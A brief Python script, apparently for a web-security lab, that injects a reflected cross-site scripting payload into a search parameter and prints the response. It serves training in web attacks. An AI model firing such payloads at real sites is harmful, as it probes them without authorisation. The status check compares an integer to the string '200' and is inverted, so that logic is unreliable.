import requests

payload = "<script>alert('xss')</script>"

#Change url defined by the lab
url = 'https://acdd1f6b1e553465c0518da6002a0094.web-security-academy.net/?search=' + payload

response = requests.get(url)

print(response.status_code)

if response.status_code == '200':
    print("Error")
else:
    print(response.content)